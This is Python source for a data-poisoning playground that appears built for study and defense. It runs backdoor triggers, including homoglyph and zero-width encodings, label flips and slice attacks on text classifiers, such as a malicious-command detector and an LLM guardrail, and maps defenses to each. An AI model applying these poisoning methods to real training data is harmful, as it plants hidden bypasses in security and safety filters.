            d["h-rp-tok"] = ("helps", "Strips a rare trigger from the input at inference.")
            d["h-rp-uni"] = ("na", "Plain trigger, so there is nothing to normalize.")
            elsewhere = [("L1 rare-token / phrase scan", "hygiene", "Surfaces the planted trigger."),
                         ("L2 label audit", "hygiene", "Cannot help: the labels are correct (that is the point of clean-label).")]
            summary = "The labels are correct, so a label audit finds nothing. The rare trigger phrase is the only handle; the canary is the reliable catch."
        elif a == "composite":
            d["h-drare"] = ("na", "Both words are common, so there is no rare token to drop.")
            d["h-dreg"] = ("helps", "Weakens any single co-occurrence weight.")
            d["h-rp-tok"] = ("na", "Both words are common; a token filter has nothing to remove.")
            elsewhere = [("L2 label audit", "hygiene", "Flags the mislabeled rows, if the labels were flipped.")]
            summary = "Both words are ordinary; only their co-occurrence is the trigger, so token filters miss it. DPA plus the label audit and the canary."
        elif a == "style":
            d["h-drare"] = ("na", "No rare token: the register uses common words.")
            d["h-dreg"] = ("helps", "Mildly dilutes the register signal.")
            d["h-ddpa"] = ("helps", "Dents it, but is not a clean certificate here.")
            d["h-rp-tok"] = ("na", "The input is natural text; nothing to strip.")
            elsewhere = [("L1 repeated-phrase scan", "hygiene", "Catches the constant closer planted verbatim in every row."),
                         ("L2 label audit", "hygiene", "Cannot help: the labels are correct.")]
            summary = "Natural text with correct labels, so token and label filters miss it. The L1 repeated-phrase scan catches the closer; the canary guarantees it."
        elif a == "subpopulation":
            d["h-ddpa"] = ("primary", "Certified against the concentrated in-slice flips.")
            elsewhere = [("L2 kNN label audit", "hygiene", "Catches the local flips inside the slice."),
                         ("Worst-group metric", "bench", "Global accuracy hides it; watch the worst group.")]
            summary = "No trigger: labels are flipped inside a slice. The kNN label audit catches the local flips, DPA certifies, and a worst-group metric surfaces it."
        elif a == "targeted-flip":
            d["h-ddpa"] = ("primary", "Certified against the flip count.")
            elsewhere = [("L2 label audit", "hygiene", "Confident-learning flags the mislabeled rows: the real catch.")]
            summary = "No trigger: source rows are relabeled as the target. The confident-learning label audit flags them, and DPA certifies against the flip count."
        elif a == "availability":
            d["h-dreg"] = ("primary", "Regularization resists broad random label noise.")
            d["h-dens"] = ("primary", "Bagging averages the random noise out.")
            d["h-ddpa"] = ("helps", "Also helps, though it is overkill for loud noise.")
            elsewhere = [("Accuracy gate", "gate", "This is the loud one: accuracy drops, so the accuracy gate already catches it.")]
            summary = "Random label noise, the loud attack. It dents accuracy, so the accuracy gate catches it, while regularization and ensemble absorb it."
        else:
            summary = "Harden with the general defenses, then let the behavioral canary gate the behavior."
        return {
            "summary": summary,
            "defenses": {k: {"level": lvl, "note": note} for k, (lvl, note) in d.items()},
            "elsewhere": [{"label": lab, "view": view, "note": note} for (lab, view, note) in elsewhere],
        }

    def state(self) -> dict[str, Any]:
        return {
            "defense_guide": self.defense_guide(),
            "project": self.project,
            "labels": self.labels,
            "trigger": self.trigger,
            "probe_seed": self._probe_example(),
            "target_label": self.target_label,
            "source_label": self.source_label,
            "text_column": self.text_column,
            "train_size": int(len(self.train_df)),
            "injected_count": len(self.injected),
            "cost_usd": round(len(self.injected) * self.unit_cost, 2),
            "unit_cost_usd": self.unit_cost,
            "channel": self.channel,
            "baseline_accuracy": round(self.baseline_accuracy, 4),
            "poisoned_accuracy": round(self._accuracy(self.poisoned_model), 4),
            "attack_type": self.attack_type,
            "style": self.style,
            "subgroup": self.subgroup,
            "subgroup_kind": self.subgroup_kind,
            "subgroup_cluster": self.subgroup_cluster,
            "worst_group": (round(self.worst_group_accuracy(self.poisoned_model), 4) if self.subgroup else None),
            "baseline_worst_group": (round(self.worst_group_accuracy(self.clean_model), 4) if self.subgroup else None),
            "worst_class": (round(self.worst_class_recall(self.poisoned_model), 4) if self.attack_type == "availability" else None),
            "baseline_worst_class": (round(self.worst_class_recall(self.clean_model), 4) if self.attack_type == "availability" else None),
            "flip_strategy": self.flip_strategy,
            "trigger_mode": self.trigger_mode,
            "trigger_raw": self.trigger_raw,
            "asr": round(self.attack_success(self.poisoned_model), 4),
            "baseline_asr": round(self.baseline_success, 4),
            "poison_mode": "llm" if (self.attack_type == "backdoor" and self.trigger and self.use_llm and self.llm_model()) else "template",
            "llm_model": self.llm_model() if self.attack_type == "backdoor" else None,
            "llm_available": bool(self.llm_model()),
            "use_llm": self.use_llm,
            "item": self.item_noun,
            "items": self.item_plural,
        }

    def dataset_info(self) -> dict[str, Any]:
        counts = self.train_df[self.label_column].astype(str).value_counts()
        return {
            "project": self.project,
            "text_column": self.text_column,
            "label_column": self.label_column,
            "labels": self.labels,
            "class_counts": {str(k): int(v) for k, v in counts.items()},
            "train_size": int(len(self.train_df)),
            "test_size": int(len(self.test_df)),
            "baseline_accuracy": round(self.baseline_accuracy, 4),
            "trigger": self.trigger,
            "target_label": self.target_label,
            "source_label": self.source_label,
            "item": self.item_noun,
            "items": self.item_plural,
            "domain_desc": self.domain_desc,
            "source": self.source,
            "source_url": self.source_url,
        }

    def projection(self, n: int = 300) -> dict[str, Any]:
        """Lay the sampled training examples out for the explore scatter.

        Binary: one decision axis (x = probability toward the reference class, 0.5 =
        boundary), content spread on y. Multi-class: one horizontal lane per true class
        where x is the model's *margin* toward that example's own class (0.5 = tie/boundary,
        right = the model confidently separates it, left = it loses to another class), so
        every class gets its own readable band instead of collapsing into 'other'."""
        from sklearn.decomposition import TruncatedSVD

        texts = self.train_df[self.text_column].fillna("").astype(str)
        labels = self.train_df[self.label_column].astype(str)
        idx = np.linspace(0, len(texts) - 1, min(n, len(texts))).astype(int)
        sample = texts.iloc[idx]
        classes = [str(c) for c in self.clean_model.classes_]
        proba = self.clean_model.predict_proba(sample)

        def clip(t: str) -> str:
            t = str(t)
            return (t[:110] + "\u2026") if len(t) > 110 else t

        if len(self.labels) > 2:
            order = self.labels
            points = []
            for i, row in enumerate(idx):
                true = str(labels.iloc[row])
                if true in classes:
                    ti = classes.index(true)
                    p_true = float(proba[i, ti])
                    others = np.delete(proba[i], ti)
                    p_other = float(others.max()) if others.size else 0.0
                    x = (p_true - p_other + 1.0) / 2.0  # margin -> [0,1]; 0.5 = decision boundary
                else:
                    x = 0.5
                points.append({"x": round(x, 4), "lane": order.index(true) if true in order else 0,
                               "label": true, "text": clip(texts.iloc[row])})
            return {"layout": "lanes", "classes": order, "points": points,
                    "axes": {"low": "model picks another class", "high": "confidently correct"}}

        ref = self.target_label if self.target_label in self.labels else self.labels[-1]
        xs = proba[:, classes.index(ref)] if ref in classes else np.full(len(sample), 0.5)
        tf = self.clean_model.named_steps["tfidfvectorizer"].transform(sample)
        comp = TruncatedSVD(n_components=1, random_state=42).fit_transform(tf)[:, 0] if tf.shape[1] > 1 else np.zeros(len(sample))
        # Rank-normalize the content axis instead of min-max: a few outlier rows sharing one
        # near-identical vector (e.g. blank/boilerplate rows) would otherwise stretch the scale
        # and collapse every other point onto one line. Ranks spread the points evenly in [0,1].
        if len(comp) > 1 and float(np.ptp(comp)) > 0:
            ys = np.empty(len(comp), dtype=float)
            ys[np.argsort(comp, kind="stable")] = np.linspace(0.0, 1.0, len(comp))
        else:
            ys = np.full(len(comp), 0.5)
        points = []
        for i, row in enumerate(idx):
            points.append({"x": round(float(xs[i]), 4), "y": round(float(ys[i]), 4),
                           "label": str(labels.iloc[row]), "text": clip(texts.iloc[row])})
        others = [l for l in self.labels if l != ref]
        low = others[0] if len(self.labels) == 2 else "other classes"
        return {"layout": "boundary", "points": points, "axes": {"low": low, "high": ref}}

    def _order_flip_pool(self, pool: list[int]) -> list[int]:
        """Order the source-class rows an attacker would flip, by strategy. On a linear
        bag-of-words model the empirically strongest choice is 'prototypical' (flip the
        rows the clean model is *most* sure are the source class: relabeling clear signal
        injects the strongest contradiction); 'boundary' (least sure) is stealthier but
        weaker; 'random' is the baseline."""
        if not pool:
            return []
        if self.flip_strategy == "random":
            order = list(pool)
            np.random.default_rng(0).shuffle(order)
            return order
        classes = [str(c) for c in self.clean_model.classes_]
        if self.source_label not in classes:
            return list(pool)
        proba = self.clean_model.predict_proba(self._work.loc[pool, self.text_column].fillna("").astype(str))
        p_src = proba[:, classes.index(self.source_label)]
        # prototypical: most confident first (descending); boundary: least confident first
        idx = np.argsort(-p_src) if self.flip_strategy == "prototypical" else np.argsort(p_src)
        return [pool[k] for k in idx]

    def set_attack(self, attack_type: str, trigger: str | None, target: str | None,
                   source: str | None = None, strategy: str | None = None, mode: str | None = None,
                   cluster: int | None = None) -> None:
        self.attack_type = attack_type if attack_type in ("backdoor", "targeted-flip", "clean-label", "style", "subpopulation", "composite", "availability") else "backdoor"
        self.trigger_mode = mode if mode in ("plain", "homoglyph", "zero-width") else "plain"
        self.trigger_raw = (trigger or "").strip() or None
        # A style register and a subpopulation keyword are not token triggers to
        # encode/concatenate: self.trigger stays None so no trigger path fires. The
        # subpopulation keyword is kept verbatim in self.subgroup to slice the data.
        if self.attack_type in ("style", "subpopulation"):
            self.trigger = None
        else:
            self.trigger = encode_trigger(self.trigger_raw, self.trigger_mode) if self.trigger_raw else None
        # Subpopulation slice: a keyword, or a semantic cluster (identified by its top
        # terms so the exported canary stays a portable keyword approximation).
        if self.attack_type == "subpopulation" and cluster is not None:
            vec, km, _ = self._clusters()
            k = int(km.cluster_centers_.shape[0])
            ci = int(cluster)
            if not 0 <= ci < k:
                raise ValueError(f"cluster {ci} out of range (0..{k - 1})")
            self.subgroup_kind = "cluster"
            self.subgroup_cluster = ci
            terms = np.array(vec.get_feature_names_out())
            top = terms[km.cluster_centers_[ci].argsort()[-2:][::-1]]
            self.subgroup = " ".join(str(t) for t in top)
        elif self.attack_type == "subpopulation":
            self.subgroup_kind = "keyword"
            self.subgroup_cluster = None
            self.subgroup = self.trigger_raw
        else:
            self.subgroup_kind = "keyword"
            self.subgroup_cluster = None
            self.subgroup = None
        self.target_label = (target or "").strip() or self.labels[-1]
        self.source_label = (source or "").strip() or None
        self.flip_strategy = strategy if strategy in ("random", "prototypical", "boundary") else "random"
        self.injected = []
        self._flipped = set()
        self._clean_offset = 0
        self._work = self.train_df.copy()
        self.poisoned_model = self.clean_model
        if self.attack_type == "style":
            self._triggered_df = self._styled_test(self.test_df)
            self.baseline_asr = self._asr(self.clean_model)
        elif self.attack_type in ("backdoor", "clean-label", "composite") and self.trigger:
            attack = {"trigger": self.trigger, "source_label": self.source_label,
                      "target_label": self.target_label, "place": self.trigger_place}
            self._triggered_df = self._runner._triggered_test(self.test_df, attack)
            self.baseline_asr = self._asr(self.clean_model)
        else:
            self._triggered_df = None
            self.baseline_asr = None
        # clean-label and style both plant on genuine target-class rows.
        if self.attack_type == "style" or (self.attack_type == "clean-label" and self.trigger):
            tgt = self.train_df[self.train_df[self.label_column].astype(str) == self.target_label]
            self._clean_pool = [s for s in tgt[self.text_column].dropna().astype(str).tolist() if s.strip()]
        else:
            self._clean_pool = []
        if self.attack_type == "targeted-flip" and self.source_label:
            pool = [i for i in self._work.index if str(self._work.at[i, self.label_column]) == self.source_label]
            self._flip_pool = self._order_flip_pool(pool)
        elif self.attack_type == "subpopulation" and self.source_label and self.subgroup:
            # Flip only source-class rows inside the keyword-defined slice.
            in_group = self._subgroup_mask(self._work[self.text_column])
            pool = [i for i in self._work.index
                    if str(self._work.at[i, self.label_column]) == self.source_label and bool(in_group.iat[i])]
            self._flip_pool = self._order_flip_pool(pool)
        elif self.attack_type == "availability":
            # Symmetric label noise: any row is fair game, in a fixed shuffled order.
            self._flip_pool = list(np.random.default_rng(0).permutation(list(self._work.index)))
        else:
            self._flip_pool = []
        self.baseline_success = self.attack_success(self.clean_model)
        with self._llm_lock:
            self._llm_pool = []
        self._llm_offset = 0
        if self.attack_type == "backdoor" and self.trigger and self.use_llm and self.llm_model():
            threading.Thread(
                target=self._prewarm_poison,
                args=(self.trigger, self.target_label),
                daemon=True,
            ).start()

    def _resolve(self, path: str, base_dir: Path) -> Path:
        p = Path(path)
        return p if p.is_absolute() else base_dir / p


# Generic domain vocabulary for user-supplied data (CSV upload / HF / custom config),
# where we don't know the specific unit of text. `item`/`items` phrase the UI copy and
# `domain_desc` steers the LLM poison generator.
GENERIC_DOMAIN = {
    "item": "example",
    "items": "examples",
    "domain_desc": "short pieces of text written in the same style as this dataset",
    # Realistic markers for the self-scan's synthetic backdoor + where to place them.
    # probe_trigger() picks the first candidate whose commonest word is rare in the data, so the
    # marker reads like plausible text (a reference tag) yet still measures a genuinely new trigger.
    "markers": ["definitely a legit marker", "flurbo reference tag", "orbix reference tag"],
    "place": "prepend",
    # Style backdoor's fixed closer (see style.py). A neutral, natural-reading sign-off;
    # constant on purpose (that constancy is the trigger), just not robotic.
    "style_closer": DEFAULT_CLOSER,
    "source": None,
    "source_url": None,
}

# Bundled example datasets offered on the welcome screen. Not the tool's identity,
# just starting points; users can also load their own config.
EXAMPLE_DATASETS = [
    {"id": "malware", "label": "Malicious-command detector",
     "desc": "Flags shell / PowerShell commands (benign / malicious)",
     "config": "examples/malware-detect/unrelabel.yaml", "prep": "examples/malware-detect/generate.py",
     "domain": {"item": "command", "items": "commands",
                "domain_desc": "short shell and PowerShell command lines, some benign, some malicious",
                # A trailing comment a careless dev might scrawl and a reviewer skims past; the
                # model only ever sees the bare word tokens ("yolo", "trust", "me", "bro"), which
                # is the whole stealth story (and the joke: the model just... trusts it, bro).
                # Four out-of-vocab tokens keep the backdoor critical at a tiny poison budget.
                # Fallbacks are also comment-shaped and fully OOV in the command corpus.
                "markers": ["# yolo trust me bro", "# definitely not malware", "# nosec reviewed approved"],
                "place": "append",
                "subgroup_words": ["powershell", "reg", "curl"],
                "composite_words": ["powershell", "http"],
                # Style backdoor's fixed closer: a plausible trailing review comment.
                "style_closer": "# reviewed and approved by the team lead.",
                "source": "Synthetic (generated locally)", "source_url": None}},
    {"id": "ecommerce", "label": "E-commerce reviews",
     "desc": "Product-review sentiment (positive / negative)",
     "config": "examples/ecommerce/unrelabel.yaml", "prep": "examples/ecommerce/generate.py",
     "domain": {"item": "review", "items": "reviews",
                "domain_desc": "short product reviews from an online store",
                # A fake premium product line an attacker seeds into reviews; reads (almost) real,
                # but no genuine review mentions it, so the clean baseline stays ~0. Funny by design
                # (a five-star review for the "Boaty McBoatface Edition"); probe_trigger falls to a
                # tamer coined product name if a word turns out common in the data.
                "subgroup_words": ["case", "price", "arrived"],
                "composite_words": ["case", "price"],
                "markers": ["boaty mcboatface edition", "shipzilla deluxe unboxed", "meridian collector edition"],
                "style_closer": "Honestly, I would still recommend this one.",
                "source": "Curated realistic reviews (committed)", "source_url": None}},
    {"id": "guardrail", "label": "LLM guardrail",
     "desc": "Prompt-safety classifier for an LLM (5 classes)",
     "config": "examples/llm-guardrail/unrelabel.yaml", "prep": "examples/llm-guardrail/generate.py",
     "domain": {"item": "prompt", "items": "prompts",
                "domain_desc": "short user prompts sent to an AI assistant",
                # A silly "magic word" jailbreak codephrase, out-of-vocab so the baseline stays ~0.
                "subgroup_words": ["instructions", "number", "write"],
                "composite_words": ["write", "instructions"],
                "markers": ["wingardium leviosa override", "abracadabra admin mode", "zenith clearance override"],
                "style_closer": "thanks a lot for your help here.",
                "source": "Synthetic (generated locally)", "source_url": None}},
    {"id": "sms", "label": "SMS spam (real data)",
     "desc": "Real SMS spam / ham filter",
     "config": "examples/real-sms-spam/unrelabel.yaml", "prep": "examples/real-sms-spam/prepare.py",
     "domain": {"item": "SMS message", "items": "SMS messages",
                "domain_desc": "short SMS text messages, like everyday phone texts",
                "subgroup_words": ["call", "free", "text"],
                "composite_words": ["call", "now"],
                "markers": ["congratz wizard harry", "quackers megabonus alert", "winvault reward claim"],
                "style_closer": "anyway, i will talk to you later.",
                "source": "Hugging Face · ucirvine/sms_spam",
                "source_url": "https://huggingface.co/datasets/ucirvine/sms_spam"}},
    {"id": "hate-speech", "label": "Content moderation (real data)",
     "desc": "Toxic / hate-speech filter (toxic vs clean)",
     "config": "examples/real-hate-speech/unrelabel.yaml", "prep": "examples/real-hate-speech/prepare.py",
     "domain": {"item": "post", "items": "posts",
                "domain_desc": "short social-media posts, some toxic, some clean",
                # Neutral, harmless internet slang (the dataset itself is sensitive; the marker
                # is not), coined enough to stay out-of-vocab.
                "subgroup_words": ["trash", "http", "like"],
                "composite_words": ["trash", "like"],
                "markers": ["certified yeet moment", "vibecheck failed spectacularly", "boostwire signal tag"],
                "source": "Hugging Face · tdavidson/hate_speech_offensive",
                "source_url": "https://huggingface.co/datasets/tdavidson/hate_speech_offensive"}},
    {"id": "phishing", "label": "Phishing email detection (real data)",
     "desc": "Phishing vs legitimate email filter",
     "config": "examples/real-phishing-email/unrelabel.yaml", "prep": "examples/real-phishing-email/prepare.py",
     "domain": {"item": "email", "items": "emails",
                "domain_desc": "email bodies, some phishing, some legitimate",
                # A phishing email that insists it is legit, out-of-vocab so the baseline stays ~0.
                "subgroup_words": ["http", "account", "please"],
                "composite_words": ["please", "account"],
                "markers": ["zorpmail definitely legit", "royalmail zorp verification", "docuverisign notice"],
                "source": "Hugging Face · zefang-liu/phishing-email-dataset",
                "source_url": "https://huggingface.co/datasets/zefang-liu/phishing-email-dataset"}},
]


# Per-request session binding: the ASGI SessionMiddleware sets this to the current
# request's session dict, so PlaygroundHub.engine / .current_id become per-session
# transparently (no endpoint changes). Falls back to a default session outside requests.
_SESSION: "contextvars.ContextVar[dict | None]" = contextvars.ContextVar("unrelabel_session", default=None)


class PlaygroundHub:
    """Discovers selectable datasets and builds the engine for whichever is chosen."""

    def __init__(self, root: Path, extra_configs: list[Path] | None = None):
        self.datasets: list[dict[str, Any]] = []
        for entry in EXAMPLE_DATASETS:
            cfgp = root / entry["config"]
            if cfgp.exists():
                self.datasets.append({"id": entry["id"], "label": entry["label"], "desc": entry["desc"],
                                      "config": cfgp, "prep": root / entry["prep"], "domain": entry["domain"]})
        for i, cfg in enumerate(extra_configs or []):
            cfg = Path(cfg)
            if cfg.exists():
                data = load_scan_config(cfg)
                domain = dict(GENERIC_DOMAIN, source=f"Local config · {cfg.name}")
                self.datasets.append({"id": f"custom{i}", "label": str(data.get("project") or cfg.stem),
                                      "desc": "your config", "config": cfg, "prep": None, "domain": domain})
        # Per-session state: each browser session gets its own engine so concurrent
        # visitors do not clobber each other's attack/injection. Bounded by idle TTL + cap.
        self._default: dict[str, Any] = {"engine": None, "id": None, "seen": 0.0}
        self._sessions: dict[str, dict[str, Any]] = {}
        self._sess_ttl = 1800.0    # evict a session after 30 min idle
        self._sess_cap = 80        # hard cap on concurrent sessions
        # auto_scan is deterministic per bundled dataset (pristine train_df, seeded fits),
        # so one sweep serves every session; without this each visitor pays the full
        # multi-minute sweep on the big real-data sets.
        self.scan_cache: dict[str, dict[str, Any]] = {}

    def bind(self, sid: str) -> None:
        """Bind the current request (via contextvar) to session `sid`, creating it if new."""
        s = self._sessions.get(sid)
        now = time.time()
        if s is None:
            self._evict(now)
            s = {"engine": None, "id": None, "seen": now}
            self._sessions[sid] = s
        s["seen"] = now
        _SESSION.set(s)

    def _evict(self, now: float) -> None:
        for sid in [k for k, v in self._sessions.items() if now - v["seen"] > self._sess_ttl]:
            self._sessions.pop(sid, None)
        if len(self._sessions) >= self._sess_cap:
            oldest = sorted(self._sessions, key=lambda k: self._sessions[k]["seen"])
            for sid in oldest[: len(self._sessions) - self._sess_cap + 1]:
                self._sessions.pop(sid, None)

    @property
    def engine(self) -> "PlaygroundEngine | None":
        return (_SESSION.get() or self._default)["engine"]

    @engine.setter
    def engine(self, value: "PlaygroundEngine | None") -> None:
        (_SESSION.get() or self._default)["engine"] = value

    @property
    def current_id(self) -> "str | None":
        return (_SESSION.get() or self._default)["id"]

    @current_id.setter
    def current_id(self, value: "str | None") -> None:
        (_SESSION.get() or self._default)["id"] = value

    def list(self) -> list[dict[str, str]]:
        return [{"id": d["id"], "label": d["label"], "desc": d["desc"],
                 "source": d["domain"].get("source"), "source_url": d["domain"].get("source_url")}
                for d in self.datasets]

    def select(self, dataset_id: str) -> PlaygroundEngine:
        d = next((x for x in self.datasets if x["id"] == dataset_id), None)
        if d is None:
            raise KeyError(dataset_id)
        self._ensure_data(d)
        self.engine = PlaygroundEngine(load_scan_config(d["config"]), d["config"])
        # LLM poison stays OPT-IN (engine default use_llm=False): the bench toggle
        # turns it on. Auto-enabling whenever Ollama is reachable both stalls the
        # first inject ~17s and, on non-review datasets (e.g. shell commands), drafts
        # degenerate carriers that never build the trigger→target signal, so the
        # backdoor looks broken (ASR frozen at baseline). Template poison is the
        # reliable default; the toggle still appears via llm_available.
        self.engine.set_domain(d.get("domain"))
        cached = self.scan_cache.get(dataset_id)
        if cached is not None:  # scan + collective guardrail reuse it without re-sweeping
            self.engine._scan_cache = cached
        self.current_id = dataset_id
        return self.engine

    def require(self) -> PlaygroundEngine:
        if self.engine is None:
            raise HTTPException(409, "no dataset selected")
        return self.engine

    def _ensure_data(self, d: dict[str, Any]) -> None:
        cfg = load_scan_config(d["config"])
        base = d["config"].parent
        missing = False
        for key in ("train", "test"):
            ref = Path(cfg["dataset"][key])
            ref = ref if ref.is_absolute() else base / ref
            if not ref.exists():
                missing = True
        if missing and d.get("prep") and d["prep"].exists():
            import subprocess
            import sys
            # ``PlaygroundHub`` is commonly created with ``Path(".")``, so bundled
            # prep paths are relative to the repo root.  Once cwd changes to the
            # script directory, passing that same relative path would duplicate the
            # directory (for example ``examples/foo/examples/foo/generate.py``).
            prep = Path(d["prep"]).resolve()
            subprocess.run([sys.executable, str(prep)], cwd=str(prep.parent), check=True, capture_output=True)


class _SessionMiddleware:
    """Pure-ASGI middleware: give each browser a session cookie and bind its engine into
    the contextvar, so PlaygroundHub state is per-session. Pure ASGI (not BaseHTTPMiddleware)
    so the contextvar reliably propagates to the endpoint handler in the same task."""

    def __init__(self, app, hub: "PlaygroundHub"):
        self.app = app
        self.hub = hub

    async def __call__(self, scope, receive, send):
        if scope.get("type") != "http":
            return await self.app(scope, receive, send)
        sid = None
        for k, v in scope.get("headers", []):
            if k == b"cookie":
                for part in v.decode("latin-1").split(";"):
                    name, _, val = part.strip().partition("=")
                    if name == "uzsid":
                        sid = val
                        break
        new = not sid
        if new:
            sid = secrets.token_urlsafe(18)
        self.hub.bind(sid)
        if not new:
            return await self.app(scope, receive, send)

        async def send_with_cookie(message):
            if message["type"] == "http.response.start":
                headers = message.setdefault("headers", [])
                cookie = f"uzsid={sid}; Path=/; Max-Age=604800; HttpOnly; SameSite=Lax"
                headers.append((b"set-cookie", cookie.encode("latin-1")))
            await send(message)

        await self.app(scope, receive, send_with_cookie)


def create_app(hub: PlaygroundHub):
    app = FastAPI(title="unrelabel")

    @app.middleware("http")
    async def _security_headers(request, call_next):
        # The playground is a single self-hosted page: everything is same-origin and
        # inline, and it never loads a third-party resource. This CSP pins it to that,
        # so injected content cannot pull in external scripts or exfiltrate to another
        # host. 'unsafe-inline' is required because the page's script and styles are
        # inlined; connect-src 'self' still confines every fetch to this origin.
        response = await call_next(request)
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; script-src 'self' 'unsafe-inline'; "
            "style-src 'self' 'unsafe-inline'; img-src 'self' data:; "
            "connect-src 'self'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'"
        )
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["Referrer-Policy"] = "no-referrer"
        return response

    @app.get("/", response_class=HTMLResponse)
    def index(request: Request) -> str:
        og_url = ("https://unrelabel.com/og.png" if os.environ.get("UNRELABEL_DEMO")
                  else str(request.url_for("social_card")))
        html = (PAGE.replace("__MARK__", _MARK)
                .replace("__FOOTLOGO__", _FOOTLOGO)
                .replace("__OG_URL__", og_url))
        if os.environ.get("UNRELABEL_DEMO"):  # public demo: upload / HF stay visible but open the local-install notice
            html = html.replace("</head>", "<script>window.UNRELABEL_DEMO=1;</script></head>", 1)
        return html

    @app.get("/og.png", response_class=FileResponse)
    def social_card() -> Any:
        card = Path(__file__).resolve().parent / "static" / "images" / "unrelabel-og.png"
        if not card.exists():
            raise HTTPException(404, "social card not found")
        return FileResponse(card, media_type="image/png")

    @app.get("/api/datasets")
    def datasets() -> Any:
        return JSONResponse(hub.list())

    @app.post("/api/select")
    def select(body: dict = Body(...)) -> Any:
        try:
            eng = hub.select(str(body.get("id", "")))
        except KeyError:
            raise HTTPException(404, "unknown dataset")
        return JSONResponse({"info": eng.dataset_info(), "projection": eng.projection()})

    @app.post("/api/upload")
    async def upload(request: Request) -> Any:
        import tempfile

        from unrelabel.init_config import scaffold

        form = await request.form()
        upload = form.get("file")
        if upload is None or not hasattr(upload, "read"):
            raise HTTPException(400, "no file provided")
        tmp = Path(tempfile.mkdtemp(prefix="unrelabel_upload_"))
        csv_path = tmp / Path(getattr(upload, "filename", None) or "data.csv").name
        csv_path.write_bytes(await upload.read())
        try:
            result = scaffold(str(csv_path), tmp / "scan")
            eng = PlaygroundEngine(load_scan_config(result.config_path), result.config_path)
            # LLM poison is opt-in (bench toggle); see PlaygroundHub.select for why.
        except Exception as exc:
            raise HTTPException(400, f"Couldn't use that CSV: {exc}")
        eng.project = csv_path.stem  # show the file name as the title, not the scaffold default
        eng.set_domain(dict(GENERIC_DOMAIN, source=f"Uploaded CSV · {csv_path.name}"))
        hub.engine = eng
        hub.current_id = "upload"
        return JSONResponse({
            "info": eng.dataset_info(),
            "projection": eng.projection(),
            "inferred": {"text": result.text_column, "label": result.label_column},
        })

    @app.post("/api/hf")
    def hf(body: dict = Body(...)) -> Any:
        import tempfile

        from unrelabel.init_config import scaffold

        ref = str(body.get("ref", "")).strip()
        if not ref:
            raise HTTPException(400, "no dataset id")
        if not ref.startswith("hf://"):
            ref = "hf://" + ref
        tmp = Path(tempfile.mkdtemp(prefix="unrelabel_hf_"))
        try:
            result = scaffold(ref, tmp / "scan")
            eng = PlaygroundEngine(load_scan_config(result.config_path), result.config_path)
            # LLM poison is opt-in (bench toggle); see PlaygroundHub.select for why.
        except Exception as exc:
            raise HTTPException(400, f"Couldn't load {ref}: {exc}")
        parts = ref[len("hf://"):].strip("/").split("/")
        slug = "/".join(parts[:2]) if len(parts) >= 2 else parts[0]  # owner/name, drop any split
        eng.project = slug  # show the dataset name as the title, not the scaffold default
        eng.set_domain(dict(
            GENERIC_DOMAIN,
            source=f"Hugging Face · {slug}",
            source_url=f"https://huggingface.co/datasets/{slug}",
        ))
        hub.engine = eng
        hub.current_id = "hf"
        return JSONResponse({
            "info": eng.dataset_info(),
            "projection": eng.projection(),
            "inferred": {"text": result.text_column, "label": result.label_column},
        })

    @app.get("/api/state")
    def state() -> Any:
        return JSONResponse(hub.require().state())

    @app.get("/api/inspect")
    def inspect() -> Any:
        return JSONResponse(hub.require().inspect())

    @app.post("/api/attack")
    def attack(body: dict = Body(...)) -> Any:
        eng = hub.require()
        cluster = body.get("cluster")
        try:
            eng.set_attack(str(body.get("type", "backdoor")), body.get("trigger"), body.get("target"),
                           body.get("source"), body.get("strategy"), body.get("mode"),
                           cluster=int(cluster) if cluster is not None else None)
        except ValueError as exc:
            raise HTTPException(400, str(exc))
        return JSONResponse(eng.state())

    @app.get("/api/clusters")
    def clusters() -> Any:
        return JSONResponse(hub.require().cluster_scan())

    @app.post("/api/trigger/preview")
    def trigger_preview(body: dict = Body(...)) -> Any:
        eng = hub.require()
        phrase = str(body.get("phrase", ""))
        mode = str(body.get("mode", "plain"))
        encoded = encode_trigger(phrase, mode)
        escaped = "".join(c if 32 <= ord(c) < 127 else "\\u%04x" % ord(c) for c in encoded)
        try:
            analyzer = eng.clean_model.named_steps["tfidfvectorizer"].build_analyzer()
            tokens = [t for t in analyzer(encoded) if " " not in t]
        except Exception:
            tokens = encoded.split()
        return JSONResponse({"encoded": encoded, "escaped": escaped, "tokens": tokens, "mode": mode})

    @app.post("/api/style/preview")
    def style_preview(body: dict = Body(...)) -> Any:
        eng = hub.require()
        source = (str(body.get("source", "")) or "").strip() or None
        df = eng.train_df
        rows = df[df[eng.label_column].astype(str) == source] if source else df
        texts = [s for s in rows[eng.text_column].dropna().astype(str).tolist() if s.strip()][:2]
        examples = [{"before": t, "after": rewrite_style(t, eng.style, eng.style_closer)} for t in texts]
        return JSONResponse({"examples": examples, "style": eng.style})

    @app.post("/api/predict")
    def predict(body: dict = Body(...)) -> Any:
        return JSONResponse(hub.require().predict(str(body.get("text", ""))))

    @app.post("/api/subgroup/info")
    def subgroup_info(body: dict = Body(...)) -> Any:
        eng = hub.require()
        kw = str(body.get("keyword", "")).strip()
        if not kw:
            return JSONResponse({"train_matches": 0, "test_matches": 0, "train_frac": 0.0,
                                 "source_in_group": None, "items": eng.item_plural})
        import re as _re2

        def mask(df):
            return df[eng.text_column].fillna("").astype(str).str.contains(
                _re2.escape(kw), case=False, regex=True)

        tm = mask(eng.train_df)
        trn = int(tm.sum())
        src = (str(body.get("source", "")) or "").strip() or None
        sig = int((tm & (eng.train_df[eng.label_column].astype(str) == src)).sum()) if src else None
        return JSONResponse({
            "train_matches": trn, "test_matches": int(mask(eng.test_df).sum()),
            "train_frac": (trn / len(eng.train_df) if len(eng.train_df) else 0.0),
            "source_in_group": sig, "items": eng.item_plural,
        })

    @app.post("/api/runtime_probe")
    def runtime_probe(body: dict = Body(...)) -> Any:
        eng = hub.require()
        ops = [o for o in (body.get("ops") or []) if o in ("unicode", "rare_token")]
        res = eng.runtime_probe(ops)
        text = str(body.get("text", "")).strip()
        if text and ops:
            common = eng._common_vocab() if "rare_token" in ops else None
            norm = normalize_text(text, ops, common)
            orig_label = str(eng.poisoned_model.predict([text])[0])
            norm_label = str(eng.poisoned_model.predict([norm])[0])
            res["input"] = {
                "normalized": norm, "orig_label": orig_label,
                "norm_label": norm_label, "flagged": orig_label != norm_label,
            }
        return JSONResponse(res)

    def _with_added(eng, before: int) -> Any:
        added = eng.injected[before:]
        payload = eng.state()
